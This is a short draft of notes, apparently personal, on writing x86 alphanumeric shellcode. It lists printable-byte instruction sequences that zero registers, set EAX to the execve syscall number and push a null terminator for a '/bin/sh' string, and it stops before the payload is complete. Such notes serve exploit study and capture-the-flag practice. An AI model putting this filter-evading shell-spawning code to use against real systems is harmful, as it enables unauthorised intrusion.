Draft
---

## Reference
- http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes
- turn on markdown syntax in VIM: ```au BufRead,BufNewFile *.md set filetype=markdown```

## [P1] ECX: set to 0
```
j 0:            PUSH 0x30
X:              POP EAX
H:              DEC EAX     * 48
P:              PUSH EAX
Y:              POP ECX
```

## [P2] EDX: set to 0
```
P:              PUSH EAX
Z:              POP EDX
```

## [P3] EAX: set to 11 (0x0b)
```
j 0:            PUSH 0x30
X:              POP EAX
H:              DEC EAX     * (48-11) = 37
```

## [P4] PUSH 0 ('\0' for string "/bin/sh")
```
R:              PUSH EDX
```
